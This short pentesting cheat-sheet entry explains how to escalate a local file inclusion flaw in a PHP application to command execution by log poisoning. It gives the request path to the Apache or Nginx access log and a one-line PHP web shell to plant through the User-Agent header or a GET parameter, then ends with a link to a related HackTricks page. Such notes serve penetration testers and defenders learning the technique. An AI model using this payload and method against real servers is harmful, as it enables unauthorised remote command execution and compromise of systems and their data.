LFI
index.php?filename=/var/log/apache2/access.log
If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to `**/var/log/apache2/access.log**` **or** `**/var/log/nginx/access.log**`, set inside the **user agent** or inside a **GET parameter** a php shell like `**<?php system($_GET['c']); ?>**` and include that file

https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo